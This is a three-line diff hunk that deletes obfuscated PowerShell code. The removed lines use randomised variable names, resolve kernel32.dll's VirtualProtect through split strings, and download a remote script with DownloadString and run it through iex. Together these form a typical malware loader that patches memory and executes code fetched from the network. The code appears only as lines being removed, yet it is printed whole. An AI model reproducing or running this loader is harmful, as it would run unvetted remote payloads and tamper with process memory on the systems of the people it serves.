@@ -1,3 +1,0 @@
-$XCQDadxNbLfURFNOJXQrZIlcpxtZbOIzANFLnvn = 0
-[IntPtr] $UYLcDDeuSsOzSZNbbXOwEvpDlB = Get-FunctionBaseAddress -jIbyTTEdfNkRSnxLLPxHLJfdGPvxreBLBLEQJ ("kern"+"el32.dll") -CPuKgDZpBRAsCrMeUVss ("Virtual"+"Protect")
-$wbc.DownloadString("$prefixpath/Raw.ps1.c5") | iex
